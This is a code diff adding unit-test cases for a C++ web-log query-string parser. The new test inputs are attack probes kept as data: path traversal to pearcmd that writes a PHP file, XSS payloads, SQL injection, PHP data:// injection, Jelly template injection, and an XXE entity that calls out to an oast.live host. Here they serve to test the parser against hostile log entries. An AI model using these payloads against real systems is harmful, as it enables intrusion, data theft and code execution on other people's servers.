@@ -104,6 +104,17 @@ namespace DB {
 
 BOOST_TEST_DONT_PRINT_LOG_VALUE(Ingestor::Stats);
 
+const std::string badHexIn {
+#embed "fixtures/badHex.in.txt"
+};
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wnarrowing"
+#pragma GCC diagnostic ignored "-Wconversion"
+const WebStat::QuotedString badHexExp {
+#embed "fixtures/badHex.exp.txt"
+};
+#pragma GCC diagnostic pop
+
 BOOST_DATA_TEST_CASE(QuotedStringsGood,
 		boost::unit_test::data::make<WebStat::ParseData<WebStat::QuotedString>>({
 				{R"("")", ""},
@@ -116,6 +127,9 @@ BOOST_DATA_TEST_CASE(QuotedStringsGood,
 				{R"("hex\t\x41")", "hex\tA"},
 				{R"("/packages/dev-php/pecl-uploadprogress(),')\"((,,")",
 						R"LOG(/packages/dev-php/pecl-uploadprogress(),')"((,,)LOG"},
+				{R"("/sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/")",
+						R"(/sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/)"},
+				{badHexIn, badHexExp},
 		}),
 		input, expected)
 {
@@ -143,6 +157,39 @@ BOOST_DATA_TEST_CASE(QueryStringsGood,
 				{R"("?something")", "something"},
 				{R"("?some=thing")", "some=thing"},
 				{R"("?some=thing&other=thing")", "some=thing&other=thing"},
+				{R"("?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php")",
+						R"(lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php)"},
+				{R"("?device=aaaaa:a%27\";user|s.\"1337\";")", R"(device=aaaaa:a%27";user|s."1337";)"},
+				{R"("?destpage=\"<h1xxx\"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError")",
+						R"(destpage="<h1xxx"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError)"},
+				{R"("?extension=menu&view=menu&parent=\"%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),md5(999999999)),NULL,NULL,NULL,NULL,NULL--%20aa")",
+						R"(extension=menu&view=menu&parent="%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),md5(999999999)),NULL,NULL,NULL,NULL,NULL--%20aa)"},
+				{R"("?h=gentoobrowse-2.0.0_beta7&id=\"><script%20>alert(String.fromCharCode(88,83,83))</script>")",
+						R"(h=gentoobrowse-2.0.0_beta7&id="><script%20>alert(String.fromCharCode(88,83,83))</script>)"},
+				{R"("?h=\"><script%20>alert(String.fromCharCode(88,83,83))</script>&id=d3465d0d00edd302c9d6fc7672a9405921a6a7db")",
+						R"(h="><script%20>alert(String.fromCharCode(88,83,83))</script>&id=d3465d0d00edd302c9d6fc7672a9405921a6a7db)"},
+				{R"("?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq\"><script>alert(document.domain)</script>")",
+						R"(pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq"><script>alert(document.domain)</script>)"},
+				{R"("?p=1&xsg-provider=data://text/html,<?php%20echo%20md5(\"CVE-2022-0346\");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp")",
+						R"(p=1&xsg-provider=data://text/html,<?php%20echo%20md5("CVE-2022-0346");%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp)"},
+				{R"("?action=likebtn_prx&likebtn_q=aHR0cDovL2xpa2VidG4uY29tLm9hc3QubWU=\"")",
+						R"(action=likebtn_prx&likebtn_q=aHR0cDovL2xpa2VidG4uY29tLm9hc3QubWU=")"},
+				{R"("?xml=<%3fxml+version%3d\"1.0\"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+\"http%3a//d68kbl4h7ttk5ft3kh10e3yhnbxkdoni3.oast.live/xxe.xml\">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123")",
+						R"(xml=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+"http%3a//d68kbl4h7ttk5ft3kh10e3yhnbxkdoni3.oast.live/xxe.xml">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123)"},
+				{R"("?jvar_page_title=<style><j:jelly%20xmlns:j=\"jelly\"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(1337*1337);</g:evaluate></j:jelly></style>")",
+						R"(jvar_page_title=<style><j:jelly%20xmlns:j="jelly"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(1337*1337);</g:evaluate></j:jelly></style>)"},
+				{R"("?h=gentoobrowse-api-0.11.2.1&id=\"><script%20>alert(String.fromCharCode(88,83,83))</script>")",
+						R"(h=gentoobrowse-api-0.11.2.1&id="><script%20>alert(String.fromCharCode(88,83,83))</script>)"},
+				{R"("?opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts=\"%27;%0Aalert(document.domain);//%0a%27")",
+						R"(opcode=cp_preview&bg_color=AA&banner_color=B&banner_text=AAA&terms_of_use=AAA&use_policy=BBB&authenticated=False&decoded_texts="%27;%0Aalert(document.domain);//%0a%27)"},
+				{R"("?wpapp_shortcode=\"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&wpappninja_simul4=1")",
+						R"(wpapp_shortcode="%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&wpappninja_simul4=1)"},
+				{R"("?post_type=sc_order&order_type=orders&format_err=1\"></script><script>alert(document.domain)</script><script>")",
+						R"(post_type=sc_order&order_type=orders&format_err=1"></script><script>alert(document.domain)</script><script>)"},
+				{R"("?page=ph-settings&ph_message=\"><script>alert(document.domain)</script>")",
+						R"(page=ph-settings&ph_message="><script>alert(document.domain)</script>)"},
+				{R"("?entryPoint=responseEntryPoint&event=1&delegate=a<\"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept")",
+						R"(entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept)"},
 		}),
 		input, expected)
 {
